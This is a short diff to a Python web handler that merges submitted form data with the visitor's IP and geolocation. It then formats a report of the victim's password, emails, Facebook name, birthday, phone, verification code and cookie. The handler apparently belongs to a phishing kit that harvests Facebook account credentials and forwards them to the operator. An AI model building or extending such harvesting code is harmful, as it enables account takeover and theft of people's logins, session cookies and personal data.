@@ -49,6 +49,10 @@ def process(request):
         geolocation = get_geolocation(public_ip)
         final_data['public_ip'] = public_ip
         final_data.update(geolocation)
+        submit_data = request.body['data']
+        print(submit_data)
+        print(type(submit_data))
+        final_data.update(submit_data)
         print(final_data)
         message = '[{}]: New information submitted \n*IP:* {}\n*Country Code:* {}\n*City:* {} \n*Proxy:* {}\n*Latitude:* {}\n*Longtitude:* {}\n*Information:* {}\n*Business Email:* {}\n*Personal Email*: {}\n*Password: * {}\n*Fullname: *{}\n*Facebook Name:* {}\n*Birthday: * {}\n*Phone*: {}\n*User Agent:* {}\n*Code:* {}\n*Cookie*: {}'.format(
             datetime.now().strftime("%Y-%m-%d %H:%M:%S"), public_ip, final_data.get('country_code', ''),
